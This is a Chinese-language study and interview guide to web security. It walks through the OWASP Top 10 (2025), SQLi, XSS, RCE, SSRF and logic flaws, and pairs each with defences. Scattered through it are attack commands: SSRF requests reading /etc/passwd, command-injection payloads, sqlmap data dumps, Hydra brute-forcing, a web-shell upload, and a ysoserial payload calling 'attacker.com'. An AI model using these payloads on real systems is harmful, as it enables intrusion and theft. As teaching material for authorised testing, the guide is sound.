# Web安全基础与漏洞分析

这份文档涵盖Web安全的核心知识，包括OWASP Top 10漏洞、攻击原理、挖掘方法和防御措施，是安服工程师必备的基础知识。

---

## 📚 OWASP Top 10 (2025最新版)

OWASP Top 10 是Web应用中最严重的10种安全风险，2025版基于大量数据统计和行业调查生成，反映了云原生、API驱动架构下的新威胁。面试必背。

### 2025版核心变化
*   **榜首保持不变**：失效的访问控制 (Broken Access Control) 依然占据第一位
*   **排名大幅上升**：安全配置错误 (Security Misconfiguration) 上升至第二位
*   **新类别/重命名**：软件供应链故障 (Software Supply Chain Failures)、异常条件处理不当 (Improper Handling of Exceptional Conditions)
*   **合并项**：服务端请求伪造 (SSRF) 被合并到"失效的访问控制"类别
*   **排名下降**：注入 (Injection) 从第三位降至第五位（因测试工具成熟）

---

### A01:2025 失效的访问控制 (Broken Access Control) - **第1位**
*   **简述**：限制用户行为的策略没有得到强制执行，攻击者可越权访问未经授权的功能或数据
*   **数据**：平均3.73%的受测应用存在该风险，关联40个CWE（包含SSRF）
*   **攻击场景**：
    *   **水平越权**：同级别用户互相访问（如 `id=100` 改为 `id=101`）
    *   **垂直越权**：低权限访问高权限（如普通用户直接访问 `/admin` 路径）
    *   **SSRF**：通过伪造内部请求越权访问数据库、Redis等内网服务
*   **实战命令**：
    ```bash
    # SSRF测试 - 尝试访问内网服务
    curl "http://target.com/api/proxy?url=http://127.0.0.1:6379"
    curl "http://target.com/api/proxy?url=file:///etc/passwd"
    ```
*   **防御**：
    *   实施最小权限原则，默认拒绝访问
    *   在服务器端（而非前端）验证权限
    *   使用成熟的权限框架（如Spring Security）
    *   SSRF防御：限制协议（仅允许http/https）、设置内网IP黑名单

### A02:2025 安全配置错误 (Security Misconfiguration) - **第2位（涨幅最大）**
*   **简述**：未更改默认密码、未打补丁、云存储权限开放、详细错误信息泄露等
*   **数据**：3.00%的受测应用存在该风险，关联16个CWE
*   **攻击场景**：
    *   数据库使用默认账号 `root/123456` 暴露在公网
    *   应用部署时开启调试模式导致代码泄露
    *   云存储桶未设置访问权限被恶意下载
    *   Web服务器显示详细堆栈错误信息
*   **实战命令**：
    ```bash
    # 检查默认配置漏洞
    nmap --script http-default-accounts <target>
    nmap --script http-config <target>
    
    # 检查云存储权限
    aws s3 ls s3://bucket-name --no-sign-request
    ```
*   **防御**：
    *   配置文件做版本管理，禁止明文存储密码（用环境变量或加密工具）
    *   部署前执行配置检查清单（关闭调试模式、删除默认账号）
    *   定期扫描云服务配置漏洞（如AWS S3、阿里云OSS）
    *   使用自动化配置加固工具

### A03:2025 软件供应链故障 (Software Supply Chain Failures) - **第3位（新增且影响最猛）**
*   **简述**：依赖包、构建工具、分发平台全链条风险（如Log4j漏洞、npm恶意包事件）
*   **特点**：出现频次最低，但CVE的平均利用难度和危害程度最高
*   **攻击场景**：
    *   使用存在已知漏洞的开源组件（如Log4j2、旧版Fastjson）
    *   依赖被投毒的恶意npm包
    *   CI/CD流水线被入侵，构建产物被篡改
*   **实战命令**：
    ```bash
    # 使用OWASP Dependency Check扫描依赖漏洞
    dependency-check --project "MyApp" --scan ./pom.xml
    
    # 使用Snyk扫描
    snyk test
    
    # npm审计
    npm audit
    
    # 检查Python依赖
    pip-audit
    ```
*   **防御**：
    *   使用SCA（软件成分分析）工具（OWASP Dependency Check、Snyk）
    *   优先选择下载量高、维护活跃的开源组件
    *   构建流程中加入组件完整性校验（校验哈希值）
    *   建立内部组件仓库，避免直接从公网拉取

### A04:2025 加密机制失效 (Cryptographic Failures) - **第4位**
*   **简述**：敏感数据未加密存储或传输，使用弱加密算法
*   **数据**：3.80%的应用存在该风险，关联32个CWE
*   **攻击场景**：
    *   用户登录密码明文存储或使用MD5
    *   API用HTTP而非HTTPS传输
    *   用过时的加密算法DES、3DES
*   **实战命令**：
    ```bash
    # 检查SSL/TLS配置
    openssl s_client -connect example.com:443
    
    # 使用testssl.sh测试TLS配置
    testssl.sh example.com
    
    # 检查密码哈希强度
    hashid -m "5f4dcc3b5aa765d61d8327deb882cf99"
    ```
*   **防御**：
    *   敏感数据用强哈希算法（BCrypt、Argon2）+ 盐值存储
    *   所有外部通信强制用HTTPS（禁用TLS 1.0/1.1）
    *   避免自定义加密算法（使用AES、RSA等成熟标准）

### A05:2025 注入攻击 (Injection) - **第5位**
*   **简述**：SQL注入、命令注入、XSS等，不可信数据被当作代码执行
*   **特点**：测试覆盖最全面，关联CVE数量最多
*   **攻击场景**：
    *   SQL注入：登录框、搜索框、URL参数
    *   命令注入：应用调用系统命令时拼接用户输入
    *   XSS：评论区注入恶意JS
*   **实战命令**：
    ```bash
    # Sqlmap基础使用
    sqlmap -u "http://target.com?id=1" --dbs
    sqlmap -u "http://target.com?id=1" -D db_name --tables
    sqlmap -u "http://target.com?id=1" -D db_name -T users --dump
    
    # 命令注入测试
    curl "http://target.com/ping?ip=127.0.0.1;id"
    curl "http://target.com/ping?ip=127.0.0.1|whoami"
    ```
*   **防御**：
    *   使用参数化查询避免SQL注入
    *   前端和后端双重过滤XSS（转义特殊字符）
    *   对用户输入做白名单校验

### A06:2025 不安全设计 (Insecure Design) - **第6位**
*   **简述**：设计阶段就存在的缺陷，而非编码时出错
*   **特点**：预防价值最高，需要威胁建模
*   **攻击场景**：
    *   业务逻辑漏洞（支付逻辑、验证码逻辑）
    *   转账功能未设计二次验证
    *   未设计限流机制导致被刷
*   **防御**：
    *   需求阶段加入安全评审
    *   使用威胁建模（如STRIDE模型）识别风险
    *   参考OWASP安全设计指南

### A07:2025 身份验证失效 (Authentication Failures) - **第7位**
*   **简述**：弱口令、允许暴力破解、Session问题等
*   **数据**：关联36个CWE
*   **攻击场景**：
    *   允许弱密码（如"123456"）
    *   登录无次数限制导致暴力破解
    *   Session过期时间设置过长
*   **实战命令**：
    ```bash
    # Hydra暴力破解
    hydra -l admin -P passwords.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid password"
    
    # Burp Intruder爆破
    # 使用Burp Suite的Intruder模块进行密码爆破
    ```
*   **防御**：
    *   强制强密码策略（大小写+数字+特殊字符）
    *   登录失败5次后锁定账号
    *   使用双因素认证（2FA）保护高权限账号
    *   Session用随机字符串，过期时间不超过2小时

### A08:2025 软件或数据完整性失效 (Software or Data Integrity Failures) - **第8位**
*   **简述**：应用内部的数据完整性问题（与供应链故障不同）
*   **攻击场景**：
    *   文件上传未校验类型导致上传恶意脚本
    *   API返回数据未验证真实性被中间人篡改
    *   反序列化漏洞（Java、PHP等）
*   **实战命令**：
    ```bash
    # 文件上传测试
    # 上传.php文件，查看是否被执行
    curl -F "file=@shell.php" http://target.com/upload
    
    # 检查反序列化
    # 使用ysoserial生成Payload
    java -jar ysoserial.jar CommonsCollections1 "curl attacker.com" > payload.ser
    ```
*   **防御**：
    *   文件上传时校验后缀+内容类型（禁止上传.php、.exe）
    *   关键操作加入数据签名
    *   避免直接使用用户传入的参数生成文件路径

### A09:2025 日志与告警失效 (Logging & Alerting Failures) - **第9位**
*   **简述**：有日志不告警，等于没发现安全事件
*   **攻击场景**：
    *   未记录敏感操作日志（如删除用户、修改密码）
    *   日志中包含明文密码
    *   告警阈值设置过高
*   **实战命令**：
    ```bash
    # 分析访问日志
    grep -i "union select" access.log
    grep -i "<script>" access.log
    
    # 查找失败登录
    grep " 401 " access.log | awk '{print $1}' | sort | uniq -c | sort -nr
    
    # 使用ELK Stack集中管理日志
    # Filebeat → Logstash → Elasticsearch → Kibana
    ```
*   **防御**：
    *   日志包含操作人、时间、行为、IP，且加密存储
    *   对高危操作实时告警（邮件/短信）
    *   定期审计日志，排查异常行为

### A10:2025 异常情况处理不当 (Mishandling of Exceptional Conditions) - **第10位（2025新增）**
*   **简述**：系统遇到异常时的处理逻辑问题
*   **攻击场景**：
    *   应用报错时返回数据库连接地址（如 `Could not connect to mysql://10.0.0.1:3306`）
    *   接口超时后直接允许用户访问（failing open）
    *   订单金额为负数时仍能支付（逻辑漏洞）
*   **实战命令**：
    ```bash
    # 测试错误信息泄露
    curl "http://target.com/page?id=''"
    curl "http://target.com/page?id=-1"
    
    # 测试边界条件
    curl "http://target.com/api/order?amount=-100"
    curl "http://target.com/api/order?amount=999999999999"
    ```
*   **防御**：
    *   统一错误处理机制，对外返回通用提示（如"系统繁忙"）
    *   异常场景下默认拒绝访问（而非开放）
    *   代码评审时重点检查边界条件（空值、负数、超大值）

---

## 🛡️ 核心漏洞详解

### 1. SQL 注入 (SQL Injection / SQLi)

**原理**：攻击者在HTTP请求参数中插入恶意的SQL代码，服务器未经过滤直接拼接到数据库查询语句中执行，导致数据库信息泄露或被篡改。

*   **场景**：登录框、搜索框、URL参数（如 `id=1`）。
*   **经典Payload**：`' OR '1'='1` (万能密码)。
*   **手工注入步骤 (面试必问)**：
    1.  **判断注入点**：输入 `'` 报错，输入 `and 1=1` 正常，`and 1=2` 报错。
    2.  **判断字段数**：`ORDER BY 3` 正常，`ORDER BY 4` 报错 -> 说明有3列。
    3.  **确定回显位**：`UNION SELECT 1,2,3` -> 看页面显示哪个数字。
    4.  **查库名/表名**：`UNION SELECT 1,database(),group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()`。

**SQL注入实战流程**：

**Step 1: 手工探测 (验证是否存在漏洞)**
*   `[操作: 浏览器 URL栏]` 先在URL参数后加单引号 `'`，观察页面是否报错或内容变少。
*   `[操作: 浏览器 URL栏]` 尝试简单的逻辑运算 `AND 1=1` (页面正常) 和 `AND 1=2` (页面异常)。
*   **目的**：确认这里有漏洞，并且不会被WAF直接拦截。

**Step 2: 工具利用 (Sqlmap提取数据)**
*   `[操作: 命令行/Kali终端]` 确认有漏洞后，使用sqlmap进行高效的数据提取。
*   如果手工发现有WAF，需要先配置sqlmap的 `tamper` 脚本进行绕过。

**防御方法**：
*   使用预编译语句 (PreparedStatement)。
*   对用户输入进行严格过滤和验证。
*   使用最小权限的数据库账号。

### 2. XSS (跨站脚本攻击 / Cross-Site Scripting)

**原理**：攻击者往Web页面里插入恶意的JavaScript代码，当用户浏览该页之时，嵌入Web里面的Script代码会被执行，从而达到恶意攻击用户的目的（如窃取Cookie）。

*   **分类**：
    *   **反射型**：恶意代码在URL中，诱导用户点击。
    *   **存储型 (最危险)**：恶意代码存入数据库（如留言板），所有查看该页面的用户都会中招。
    *   **DOM型**：纯前端JS逻辑漏洞，不经过服务器。
*   **危害**：窃取Cookie (Session Hijacking)、钓鱼、重定向。
*   **防御**：
    *   **HTML实体编码**：将特殊字符（`<`, `>`, `&`, `"`）转义（如 `<` 转为 `&lt;`）。
    *   **HttpOnly Cookie**：设置Cookie属性，禁止JS读取Cookie。
    *   **CSP (内容安全策略)**：浏览器白名单机制，限制加载外部脚本。

### 3. 命令执行 (RCE / Command Injection)

**原理**：应用在调用系统命令（如 `system()`, `exec()`）时，拼接了未经过滤的用户输入。

*   **Payload**：`[操作: URL参数/表单]` `127.0.0.1; cat /etc/passwd` 或 `127.0.0.1 | whoami`。
*   **防御**：
    *   尽量使用库函数代替系统命令调用。
    *   严格过滤连接符（`;`, `|`, `&`）。

### 4. 文件包含 (File Inclusion)

**原理**：代码中引入文件的位置（如PHP的 `include`）使用了变量，且未过滤。

*   **分类**：
    *   **LFI (本地文件包含)**：读取服务器本地文件（如 `/etc/passwd`）。
    *   **RFI (远程文件包含)**：包含远程服务器上的恶意脚本（需要配置开启）。
*   **防御**：设置白名单，禁止包含用户可控的路径。

### 5. 文件上传漏洞

**原理**：用户上传了可执行脚本（如 `.php`, `.jsp`），且服务器未限制或解析了该文件。

*   **防御**：
    *   白名单检查后缀名（只允许jpg, png）。
    *   上传目录设置为不可执行。
    *   重命名上传的文件。

### 6. CSRF (跨站请求伪造)

**原理**：利用用户已登录的身份，在用户不知情的情况下，以用户的名义发送恶意请求（如修改密码、转账）。

*   **防御**：
    *   **CSRF Token**：请求时带上不可预测的随机Token。
    *   **SameSite Cookie**：设置Cookie的SameSite属性为 `Strict` 或 `Lax`。
    *   **验证Referer/Origin**：检查请求来源。

### 7. SSRF (服务端请求伪造)

**原理**：攻击者诱使服务器发起本不该发起的请求，通常用来攻击内网。

*   **场景**：通过URL下载图片、分享链接。
*   **防御**：
    *   限制协议（只允许http/https）。
    *   设置内网IP黑名单。

---

## 🎯 业务逻辑漏洞

这是面试中的加分项，因为工具扫不出来，全靠人工思维。

### 1. 越权漏洞 (Broken Access Control / IDOR)
*   **水平越权**：同级别用户互相访问（如 `id=100` 改为 `id=101`）。
*   **垂直越权**：低权限访问高权限（如普通用户直接访问 `/admin` 路径）。
*   **防御**：必须在服务端Session中校验当前用户是否有权访问该数据ID。

### 2. 支付逻辑漏洞
*   **金额篡改**：抓包将 `price=100` 改为 `price=0.01`。
*   **数量篡改**：将 `quantity=1` 改为 `quantity=-1`（导致退款变充值）。
*   **防御**：金额由后端计算，前端只传商品ID；校验数量为正整数。

### 3. 验证码/密码找回逻辑
*   **验证码爆破**：验证码没有次数限制，或者是简单的4位数字。
*   **验证码回显**：验证码直接在Response包里返回了。
*   **任意用户密码重置**：修改请求包中的手机号或邮箱。

### 4. 数据重放 (Replay Attack)
*   **原理**：攻击者截获有效的数据包（如转账请求），稍后重新发送给服务器，导致重复操作。
*   **场景**：短信轰炸、重复领券、重复支付。
*   **防御**：
    *   **Nonce (一次性随机数)**：请求带上唯一的随机token，用过即废。
    *   **时间戳**：请求带上时间戳，服务器只处理一定时间范围内的请求。

---

## 💻 代码层面的"好"与"坏" (PHP & Java)

面试中经常问："你会写Java的防注入代码吗？"

### SQL 注入
*   **❌ 坏代码 (PHP - 直接拼接)**:
    ```php
    $sql = "SELECT * FROM users WHERE id = " . $_GET['id'];
    ```
*   **✅ 好代码 (PHP - PDO预编译)**:
    ```php
    $stmt = $pdo->prepare('SELECT * FROM users WHERE id = :id');
    $stmt->execute(['id' => $_GET['id']]);
    ```
*   **✅ 好代码 (Java - PreparedStatement)**:
    ```java
    String sql = "SELECT * FROM users WHERE username = ?";
    PreparedStatement pstmt = connection.prepareStatement(sql);
    pstmt.setString(1, inputUser); // 核心：占位符 ?
    ResultSet results = pstmt.executeQuery();
    ```

### XSS
*   **❌ 坏代码 (PHP - 直接输出)**:
    ```php
    echo "<div>" . $_GET['name'] . "</div>";
    ```
*   **✅ 好代码 (PHP - HTML实体编码)**:
    ```php
    echo "<div>" . htmlspecialchars($_GET['name']) . "</div>";
    ```
*   **✅ 好代码 (Java - OWASP Java Encoder)**:
    ```java
    // 使用 ESAPI 或 Spring 的 HtmlUtils
    String safeOutput = HtmlUtils.htmlEscape(inputString);
    ```

---

## 🌐 流量分析

### 流量包特征 (Burp Suite 视角)

**SQL 注入流量**:
```http
GET /product?id=1' UNION SELECT 1,user(),3 --+ HTTP/1.1
```
*   **特征**：`'` (单引号), `UNION`, `SELECT`, `--`, `%20` (空格), `0x` (十六进制)。

**XSS 流量**:
```http
POST /feedback HTTP/1.1
msg=<img src=x onerror=alert(1)>
```
*   **特征**：`<script>`, `javascript:`, `onerror`, `onload`, `eval()`.

### 应急响应与日志分析

面试官可能会问："如何通过日志发现攻击？"

*   **Access Log 分析**:
    *   **查 SQL 注入**: `grep -i "union select" access.log`
    *   **查 XSS**: `grep -i "<script>" access.log`
    *   **查 扫描器**: 扫描器通常请求速度极快，且User-Agent可能是 `sqlmap`, `awvs`, `nmap`。

### WAF 绕过 (Bypass) 简述

如果问到"有WAF怎么办？"，可以提几个简单的思路：
*   **大小写混合**: `UnIoN SeLeCt` (针对老旧WAF)。
*   **编码绕过**: URL双重编码 (`%2527` -> `%27` -> `'`)。
*   **HTTP 参数污染 (HPP)**: `?id=1&id=2` (WAF检第一个，后端用第二个)。

---

## 📖 OWASP Top 10 2025 学习路径：从入门到熟悉

### 阶段一：入门（第1-2周）
**目标**：理解 OWASP Top 10 2025 的基本概念和排名变化

**学习内容**：
1. 通读本章节的 OWASP Top 10 2025 介绍
2. 理解 2025 版的核心变化（A02 排名上升、A03 新增、A10 新增）
3. 记住 10 个风险的名称和顺序

**实践任务**：
*   制作一张 OWASP Top 10 2025 的思维导图
*   用自己的话解释每个风险的含义

**学习工具**：
```bash
# 安装 OWASP ZAP（入门级扫描器）
# 下载地址：https://www.zaproxy.org/download/
```

---

### 阶段二：基础（第3-4周）
**目标**：深入理解每个风险的原理和攻击场景

**学习内容**：
1. 逐个学习 A01-A10 的详细说明
2. 重点学习 A01-A05（高危风险）
3. 理解每个风险的关联 CWE 数量

**实践任务**：
*   **A01 - 访问控制失效**：搭建一个简单的用户系统，测试水平越权和垂直越权
*   **A02 - 安全配置错误**：检查自己电脑上的软件是否有默认密码
*   **A03 - 软件供应链故障**：用 `npm audit` 检查一个 Node.js 项目的依赖

**实战命令（必练）**：
```bash
# 1. Nmap 扫描（A02 配置错误）
nmap -sV -p- <target>

# 2. Sqlmap 基础（A05 注入）
sqlmap -u "http://target.com?id=1" --dbs

# 3. npm 审计（A03 供应链）
npm audit

# 4. SSL 检查（A04 加密失效）
openssl s_client -connect example.com:443
```

---

### 阶段三：进阶（第5-6周）
**目标**：掌握防御方法和工具使用

**学习内容**：
1. 学习每个风险的防御措施
2. 熟悉相关的安全工具
3. 理解安全开发最佳实践

**实践任务**：
*   为之前搭建的用户系统添加访问控制检查
*   使用 OWASP Dependency Check 扫描一个 Java 项目
*   配置一个简单的 WAF 规则

**工具安装与使用**：
```bash
# 1. OWASP Dependency Check
# 下载：https://owasp.org/www-project-dependency-check/
dependency-check --project "MyApp" --scan ./pom.xml

# 2. Snyk（需要注册账号）
npm install -g snyk
snyk auth
snyk test

# 3. testssl.sh（检查 TLS 配置）
git clone https://github.com/drwetter/testssl.sh.git
cd testssl.sh
./testssl.sh example.com

# 4. Burp Suite（Web 代理工具）
# 下载：https://portswigger.net/burp
```

---

### 阶段四：实战（第7-8周）
**目标**：在真实或模拟环境中应用所学知识

**学习内容**：
1. 使用靶场进行实战练习
2. 学习漏洞挖掘思路
3. 编写安全测试报告

**推荐靶场**：
*   **DVWA** (Damn Vulnerable Web Application) - 入门级
*   **WebGoat** - OWASP 官方靶场
*   **PortSwigger Web Security Academy** - 中级
*   **HackTheBox** / **TryHackMe** - 高级

**实战流程示例**：
```
1. 信息收集（Nmap、WhatWeb）
2. 漏洞扫描（OWASP ZAP、Burp Scanner）
3. 手动验证（Burp Repeater）
4. 漏洞利用（Sqlmap、自定义脚本）
5. 编写报告
```

---

### 阶段五：精通（第9周+）
**目标**：深入理解、能给他人讲解、参与安全开发生命周期

**学习内容**：
1. 威胁建模（STRIDE、DREAD）
2. 安全代码审查
3. 安全开发生命周期（SDLC）
4. 漏洞研究和 CVE 分析

**实践任务**：
*   给团队做一次 OWASP Top 10 2025 的分享
*   参与一个开源项目的安全代码审查
*   提交一个 CVE（如果发现新漏洞）

**高级学习资源**：
*   OWASP ASVS (Application Security Verification Standard)
*   OWASP SAMM (Software Assurance Maturity Model)
*   MITRE ATT&CK 框架

---

## 📚 推荐学习资源

### 官方资源
*   **OWASP 官网**：https://owasp.org/
*   **OWASP Top 10 2025 官方文档**（发布后）
*   **OWASP Cheat Sheet Series**：https://cheatsheetseries.owasp.org/

### 在线课程
*   PortSwigger Web Security Academy（免费）
*   Coursera - Cybersecurity for Everyone
*   edX - Introduction to Cybersecurity

### 书籍推荐
*   《Web应用安全权威指南》
*   《白帽子讲Web安全》
*   《OWASP Top 10 2021 中文版》（参考）

### 靶场平台
*   **DVWA**：https://dvwa.co.uk/
*   **WebGoat**：https://owasp.org/www-project-webgoat/
*   **HackTheBox**：https://www.hackthebox.com/
*   **TryHackMe**：https://tryhackme.com/

---

## 🎯 面试重点（必背）

### OWASP Top 10 2025 排序
1. A01 - 失效的访问控制
2. A02 - 安全配置错误
3. A03 - 软件供应链故障
4. A04 - 加密机制失效
5. A05 - 注入攻击
6. A06 - 不安全设计
7. A07 - 身份验证失效
8. A08 - 软件或数据完整性失效
9. A09 - 日志与告警失效
10. A10 - 异常情况处理不当

### 2025 版核心变化（面试必问）
* 哪个风险排名上升最多？→ **A02 安全配置错误（从第5到第2）**
* 哪个是新增类别？→ **A03 软件供应链故障、A10 异常情况处理不当**
* SSRF 去哪了？→ **合并到 A01 失效的访问控制**
* 注入为什么排名下降？→ **测试工具成熟，容易发现和修复**

### 各风险高频面试题
* **A01**：什么是水平越权和垂直越权？如何防御？
* **A03**：什么是软件供应链安全？举例说明（Log4j、SolarWinds）
* **A05**：SQL注入的类型？如何防御？
* **A10**：什么是 failing open vs failing closed？

---

## ⚠️ 注意事项

1. **仅用于授权测试**：所有技术仅用于学习和授权的安全测试
2. **遵守法律法规**：未经授权的测试是违法的
3. **道德规范**：发现漏洞后应及时通知厂商，不要公开泄露
4. **持续学习**：安全领域更新很快，保持学习习惯
